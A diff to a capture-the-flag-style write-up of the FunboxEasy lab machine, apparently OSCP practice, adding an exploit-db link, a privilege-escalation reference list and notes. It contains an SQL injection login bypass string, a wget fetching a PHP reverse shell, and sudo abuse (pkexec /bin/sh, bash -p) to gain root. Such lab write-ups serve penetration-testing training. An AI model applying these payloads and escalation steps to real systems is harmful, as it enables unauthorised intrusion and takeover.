@@ -167,6 +167,9 @@ Shellcodes: No Results
 Papers: No Results
 root@kali:/OSCPv3/offsec_pg/FunboxEasy# searchsploit -x 47874
 ```
+https://www.exploit-db.com/exploits/47874
+
+SQL injection: ' or 1=1 -- 
 
 ![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/15.png)
 
@@ -187,8 +190,6 @@ Default pwd
 ![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/9.png)
 
 ![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/21.png)
-
-
 
 ```console
 root@kali:/OSCPv3/offsec_pg/FunboxEasy# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
@@ -335,6 +336,8 @@ User tony may run the following commands on funbox3:
     (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
 ```
 
+https://gtfobins.github.io/
+
 ```console
 tony@funbox3:~$ sudo /usr/bin/pkexec /bin/sh
 #whoami
@@ -357,3 +360,17 @@ tony@funbox3:~$ bash -p
 bash-5.0# whoami
 root
 ```
+
+References
+
+https://gtfobins.github.io/
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation
+
+https://netsec.ws/?p=337
+
+https://github.com/carlospolop/hacktricks/tree/master/linux-unix/privilege-escalation
+
+https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html
+
+https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration
